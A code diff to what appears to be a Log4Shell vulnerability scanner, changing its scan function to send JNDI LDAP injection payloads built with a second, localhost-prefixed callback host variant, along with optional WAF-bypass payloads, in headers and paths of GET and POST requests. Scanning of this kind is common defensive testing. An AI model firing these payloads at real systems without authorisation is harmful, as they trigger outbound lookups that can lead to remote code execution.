@@ -297,35 +297,37 @@ def scan_url(url, callback_host):
     global counter
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
-    payloads = [payload]
-    if args.waf_bypass_payloads:
-        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
-    paths = generate_path_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
-    for payload in payloads:
-        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
-        headers = get_fuzzing_headers(payload)
-        if args.request_type.upper() == "GET" or args.run_all_tests:
-            for path in paths:
-                get_url = f'{url}{path}'
-                future = async_session.get(url=get_url,
-                                headers=headers,
-                                verify=False,
-                                timeout=timeout)
-                future.i = counter
-                counter += 1
-                futures.append(future)
+    callback_hosts = [callback_host, f'127.0.0.1#{callback_host}']
+    for callback_host in callback_hosts:
+        payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+        payloads = [payload]
+        if args.waf_bypass_payloads:
+            payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+        paths = generate_path_payloads(f'{parsed_url["host"]}.{callback_host}', random_string)
+        for payload in payloads:
+            cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+            headers = get_fuzzing_headers(payload)
+            if args.request_type.upper() == "GET" or args.run_all_tests:
+                for path in paths:
+                    get_url = f'{url}{path}'
+                    future = async_session.get(url=get_url,
+                                    headers=headers,
+                                    verify=False,
+                                    timeout=timeout)
+                    future.i = counter
+                    counter += 1
+                    futures.append(future)
 
-        if args.request_type.upper() == "POST" or args.run_all_tests:
-            for path in paths:
-                post_url = f'{url}{path}'
-                future = async_session.post(url=post_url,
-                                headers=headers,
-                                verify=False,
-                                timeout=timeout)
-                future.i = counter
-                counter += 1
-                futures.append(future)
+            if args.request_type.upper() == "POST" or args.run_all_tests:
+                for path in paths:
+                    post_url = f'{url}{path}'
+                    future = async_session.post(url=post_url,
+                                    headers=headers,
+                                    verify=False,
+                                    timeout=timeout)
+                    future.i = counter
+                    counter += 1
+                    futures.append(future)
 
 
 def main():
